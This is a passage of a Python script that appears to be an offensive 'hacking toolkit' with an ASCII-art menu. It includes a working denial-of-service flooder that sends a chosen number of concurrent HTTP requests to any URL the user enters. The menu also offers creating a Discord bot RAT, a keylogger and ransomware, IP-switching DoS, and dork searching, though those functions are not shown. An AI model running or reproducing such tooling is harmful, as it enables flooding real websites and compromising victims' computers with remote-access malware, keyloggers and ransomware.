                            print(f"\n{category}:")
                            for i, url in enumerate(all_urls[category], 1):
                                print(f"   {i}. {url}")
                        confirm = input("\nOpen these links in browser? (yes/no): ").lower()
                        if confirm in ['yes', 'y', '']:
                            print(f"Opening {total_selected} links...")
                            for category in selected_categories:
                                for url in all_urls[category]:
                                    webbrowser.open_new_tab(url)
                                    time.sleep(0.3)
                            print(f"Opened {total_selected} links!")
                            after_choice = input("\nStart new search? (yes/no): ").lower()
                            if after_choice in ['yes', 'y', '']:
                                break
                            else:
                                print("Exiting...")
                                return
                        else:
                            print("Opening cancelled")
                except ValueError:
                    print("Please enter only numbers separated by spaces!")
                except Exception as e:
                    print(f"Error: {e}")

    main()

def dos():
    async def fetch_url(session, url, request_num):
        try:
            async with session.get(url) as response:
                text = await response.text()
                print(f"{request_num} attack -->{url} | status: {response.status} | len: {len(text)}")
        except Exception as e:
            print(f"ERROR#{request_num}: {e}")

    async def make_requests():
        url = input("url: ").strip()
        num_requests = int(input("num: "))
        print('...')
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(1, num_requests + 1):
                task = asyncio.create_task(fetch_url(session, url, i))
                tasks.append(task)
            await asyncio.gather(*tasks)

    x = """
██████╗  ██████╗ ███████╗ █████╗  ██████╗     █████╗  ████████╗ █████╗  ██████╗██╗  ██╗
██╔══██╗██╔═══██╗██╔════╝██╔══██╗██╔════╝    ██╔══██╗ ╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
██████╔╝██║   ██║█████╗  ███████║██║  ███╗   ███████║    ██║   ███████║██║     █████╔╝ 
██╔══██╗██║   ██║██╔══╝  ██╔══██║██║   ██║   ██╔══██║    ██║   ██╔══██║██║     ██╔═██╗ 
██║  ██║╚██████╔╝███████╗██║  ██║╚██████╔╝██╗██║  ██║    ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                               ██████╗  ██████╗ ██╗   ██╗
                              ██╔════╝ ██╔═══██╗██║   ██║
                              ██║  ███╗██║   ██║██║   ██║
                              ██║   ██║██║   ██║╚██╗ ██╔╝
                              ╚██████╔╝╚██████╔╝ ╚████╔╝ 
                               ╚═════╝  ╚═════╝   ╚═══╝  
               ┌──────────────────────────────────────────────────────────┐
               │   [target server]                                        │
               │   ┌──────────┐    ┌──────────┐    ┌──────────┐          │
               │   │  HOST    │◄───│ TRAFFIC  │───▶│  FLOOD   │  ███✱✱✱  │
               │   └──────────┘    └──────────┘    └──────────┘          │
               │      ▲  ▲  ▲   ▲  ▲   ▲  ▲   ▲  ▲   ▲  ▲   ▲  ▲         │
               │      │  │  │   │  │   │  │   │  │   │  │   │  │         │
               │   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         │
               └──────────────────────────────────────────────────────────┘
    ⠀⠀"""
    print(x)
    asyncio.run(make_requests())
while True:


    logo = '''
           █████               ████                                           ███                       
          ░░███               ░░███                                          ░░░                        
 ████████  ░███████    ██████  ░███  █████ ████ ████████   ██████  ████████  ████   ██████   ██████     
░░███░░███ ░███░░███  ███░░███ ░███ ░░███ ░███ ░░███░░███ ███░░███░░███░░███░░███  ███░░███ ░░░░░███    
 ░███ ░███ ░███ ░███ ░███ ░███ ░███  ░███ ░███  ░███ ░███░███ ░███ ░███ ░███ ░███ ░███ ░░░   ███████    
 ░███ ░███ ░███ ░███ ░███ ░███ ░███  ░███ ░███  ░███ ░███░███ ░███ ░███ ░███ ░███ ░███  ███ ███░░███    
 ░███████  ████ █████░░██████  █████ ░░███████  ░███████ ░░██████  ░███████  █████░░██████ ░░████████   
 ░███░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░   ░░░░░███  ░███░░░   ░░░░░░   ░███░░░  ░░░░░  ░░░░░░   ░░░░░░░░    
 ░███                                 ███ ░███  ░███               ░███                                 
 █████                               ░░██████   █████              █████                                
░░░░░                                 ░░░░░░   ░░░░░              ░░░░░                                 
    '''

    print(logo)

    logo2 = '''
    ╔════════════════════════════════════════╗
    ║             SELECT MENU                ║
    ╠════════════════════════════════════════╣
    ║1 [+] Create Discord Bot RAT            ║                
    ║2 [+] OSINT Google Dork Search          ║
    ║3 [+] DOS Attack Tool                   ║
    ║4 [+] DOS Attack Tool with IP switching ║
    ║5 [+] Searth Proxy                      ║
    ║6 [+] IP Scan                           ║
    ║7 [+] Create keylogger                  ║ 
    ║8 [+] Create Ransomware                 ║
    ╚════════════════════════════════════════╝

    https://github.com/Fsociety1146
    '''
    print(logo2)
    x = input('>>')
    if x == '1':
        dc_rat()
    elif x == '2':
        dork()
    elif x == '3':
        dos()
    elif x =='4':
        dos_proxy()
    elif x =='5':
        farm()
    elif x=='6':
        ipin()
    elif x=='7':
        keylogger()
    elif x=='8':
        winlock()


    
    else:
        print("ERROR")